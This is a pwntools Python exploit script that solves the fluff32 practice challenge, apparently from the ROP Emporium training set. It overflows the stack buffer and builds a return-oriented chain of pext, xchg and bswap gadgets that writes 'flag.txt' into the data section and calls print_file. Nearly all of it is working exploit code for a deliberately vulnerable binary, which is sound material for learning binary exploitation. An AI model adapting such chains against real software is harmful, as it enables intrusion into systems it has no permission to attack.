#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./badchars32
import struct

from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "./fluff32")
context.delete_corefiles = True
context.terminal = ["alacritty", "-e", "sh", "-c"]
rop = ROP(exe)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
break *0x0804854A
break print_file
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
# RUNPATH:  b'.'
# io = start()
# io.sendline(cyclic(100, alphabet="QWERT"))
# io.wait()

# offset = cyclic_find(io.corefile.eip, alphabet="QWERT")
# info(offset)


def bswap(x):
    return struct.unpack("<I", struct.pack(">I", x))[0]


def binaryToInt(binary):
    return int(binary, 2)


def encodeBinary(string):
    return "".join(format(ord(c), "08b") for c in string)


def decodeFromMask(mask, string):
    out = ""
    i = 0
    for a in mask:
        if a == "1":
            out += string[i]
        i += 1
    return out


io = start()

offset = 44

data_section = exe.symbols["data_start"]
xchg_ecx_dl = 0x08048555
pext_edx_ebx_eax = 0x0804854A  # edx dst, ebx src, eax mask
pop_ebx = rop.find_gadget(["pop ebx", "ret"])[0]
pop_ecx = 0x08048558
mov_eax_deadbeef = 0x0804854F
mask = 0xDEADBEEF
mask = "11011110101011011011111011101111"
outs = []
for a in "flag.txt\0":
    out = ""
    encoded = encodeBinary(a)
    i = len(encoded) - 1
    for b in mask[::-1]:
        if b == "1" and i >= 0:
            out += encoded[i]
            i -= 1
        else:
            out += "0"
    out = out[::-1]
    print("0" * (32 - len(encoded)) + encoded)
    print(mask)
    print(out)
    print("0" * (32 - len(decodeFromMask(mask, out))) + decodeFromMask(mask, out))
    print(chr(binaryToInt(decodeFromMask(mask, out))))
    print()
    outs.append(binaryToInt(out))

# print(outs)
# print(len(outs[0]))

payload = flat(offset * b"A", mov_eax_deadbeef)
i = 0
for letter in outs:
    payload += flat(
        pop_ebx, letter, pext_edx_ebx_eax, pop_ecx, bswap(data_section + i), xchg_ecx_dl
    )
    i += 1

payload += flat(exe.symbols["print_file"], 0x0, data_section)

io.sendline(payload)
io.recvuntil("you!\n")
success(io.recvline())
# io.interactive()
